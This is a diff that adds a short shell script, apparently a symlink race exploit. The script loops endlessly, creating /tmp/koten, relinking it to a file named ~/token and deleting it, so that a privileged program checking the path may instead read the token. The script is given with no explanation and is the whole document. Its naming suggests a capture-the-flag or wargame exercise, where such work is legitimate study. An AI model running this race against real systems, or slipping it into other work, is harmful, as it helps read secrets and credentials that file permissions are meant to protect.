@@ -1,0 +1,6 @@
+#!/bin/sh
+while true ; do
+        touch /tmp/koten
+        ln -fs ~/token /tmp/koten
+    rm -rf /tmp/koten
+done
